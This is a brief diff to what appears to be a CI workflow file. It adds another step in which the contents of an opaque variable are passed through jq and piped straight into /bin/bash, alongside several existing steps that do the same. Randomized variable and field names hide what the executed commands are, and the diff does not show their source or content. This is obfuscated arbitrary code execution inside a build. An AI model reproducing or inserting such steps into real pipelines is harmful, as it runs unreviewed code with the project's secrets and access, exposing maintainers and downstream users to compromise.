@@ -25,6 +25,7 @@ jobs:
           echo $l52025 | jq -r .ydel8 | /bin/bash
           echo $gdin212 | jq -r .hto797 | /bin/bash
           printf '%s' "$mcmeq81" | jq -r .rhe76583 | /bin/bash
+          printf '%s' "$d1" | jq -r .hwxjx38159 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
